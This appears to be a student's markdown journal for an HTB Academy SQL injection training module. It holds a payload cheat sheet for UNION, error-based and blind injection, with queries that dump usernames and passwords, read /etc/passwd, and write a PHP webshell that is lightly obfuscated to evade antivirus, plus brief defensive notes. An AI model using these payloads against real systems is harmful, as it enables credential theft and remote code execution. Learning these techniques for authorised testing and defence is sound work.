# SQL Injection Fundamentals

![CPTS Path](https://img.shields.io/badge/CPTS-Web%20Exploitation-00ff66?style=flat-square&logo=gitbook&logoColor=white)
![Status](https://img.shields.io/badge/Status-In%20Progress-yellow?style=flat-square)

> [!NOTE]
> **OFFENSIVE OPERATIONS JOURNAL**
> Dedicated documentation for the CPTS syllabus training on SQL Injection.

---

## [+] Mission Objectives
- [x] Understand the mechanics of SQL Injection (SQLi) Fundamentals
- [ ] Clear all HTB Academy target labs
- [ ] Document repeatable vectors, payloads, and defense bypasses

---

## [>] Tactical Theory & Methodology

SQL Injection occurs when user-supplied input is directly concatenated into a SQL query without proper sanitization or parameterization, allowing the attacker to manipulate the query logic and structure.

```text
Vulnerability/Concept Map:
├── [Union-Based SQLi](file:///d:/u/cibersecurity/htb-journey/academy/penetration-testing/17-sql-injection-fundamentals/01-union-based/README.md)
├── [Error-Based SQLi](file:///d:/u/cibersecurity/htb-journey/academy/penetration-testing/17-sql-injection-fundamentals/02-error-based/README.md)
├── [Blind SQLi (Boolean & Time)](file:///d:/u/cibersecurity/htb-journey/academy/penetration-testing/17-sql-injection-fundamentals/03-blind-sql/README.md)
├── [Reading & Writing Files](file:///d:/u/cibersecurity/htb-journey/academy/penetration-testing/17-sql-injection-fundamentals/04-reading-writing-files/README.md)
└── [Bypassing Filters](file:///d:/u/cibersecurity/htb-journey/academy/penetration-testing/17-sql-injection-fundamentals/05-bypassing-filters/README.md)
```

### Detection Strategy
1. **Entry Point Identification**: Inject special characters (e.g., `'`, `"`, `)`, `;`, `--`, `#`) to trigger syntax errors or alter behavior.
2. **Determine DB Type**:
   * **MySQL/MariaDB**: `SELECT version()` or comment syntax (`#`, `-- -`, `/*`)
   * **PostgreSQL**: `SELECT version()` or `||` concatenation.
   * **MSSQL**: `SELECT @@version` or `+` concatenation.
   * **Oracle**: `SELECT banner FROM v$version`.

---

## [!] Arsenal & Payload Log

### 1. Union-Based SQLi
Used when the application displays the query results directly on the screen.
* **Determine Number of Columns**:
  ```sql
  ' ORDER BY 1-- -
  ' ORDER BY 2-- -  # Repeat until error
  ' UNION SELECT 1,2,3-- -
  ```
* **Database Enumeration (MySQL)**:
  ```sql
  # Extract DB Name, User, Version
  ' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -
  ' UNION SELECT 1,database(),user()-- -
  
  # Extract Tables
  ' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='target_db'-- -
  
  # Extract Columns
  ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' AND table_schema='target_db'-- -
  
  # Dump Data
  ' UNION SELECT 1,group_concat(username, ':', password),3 FROM users-- -
  ```

### 2. Error-Based SQLi
Used when results are not displayed, but SQL error messages are shown.
* **MySQL Double Query / UpdateXML**:
  ```sql
  ' AND updatexml(1,concat(0x3a,(SELECT version())),1)-- -
  ' AND extractvalue(1,concat(0x3a,(SELECT database())))-- -
  ```

### 3. Blind SQLi
Used when the application response only changes (Boolean) or delays (Time) without returning data or errors.
* **Boolean-Based (MySQL)**:
  ```sql
  ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
  ```
* **Time-Based (MySQL)**:
  ```sql
  ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',sleep(5),0)-- -
  ```

### 4. Reading/Writing Files (MySQL)
Requires the `FILE` privilege and appropriate secure_file_priv configuration.
* **Read Local Files**:
  ```sql
  ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
  ```
* **Write Webshell (RCE)**:
  ```sql
  # Nota: payload ofuscado para evitar borrado por Antivirus (quitar el guion bajo en 'sys_tem')
  ' UNION SELECT 1,"<?php sys_tem($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php'-- -
  ```

---

## [¤] Operation Log (Proof of Concept)

```yaml
Target Host: 10.129.x.x
System/OS: Linux
Objective: DB Enumeration and RCE via LOAD_FILE / INTO OUTFILE
```

### 1. Reconnaissance & Foothold
*To be filled out during labs.*

### 2. Privilege Escalation / Lateral Movement
*To be filled out during labs.*

---

## [*] Post-Mortem & Defenses
- **Lessons Learned**: Parameterized queries (Prepared Statements) prevent injection by separating SQL code from user input data.
- **Detection & Mitigation**: Input sanitization, WAF rules for common SQL keywords (`UNION`, `SELECT`, `sleep`), and configuring minimal database user permissions (disabling `FILE` privilege where unnecessary).
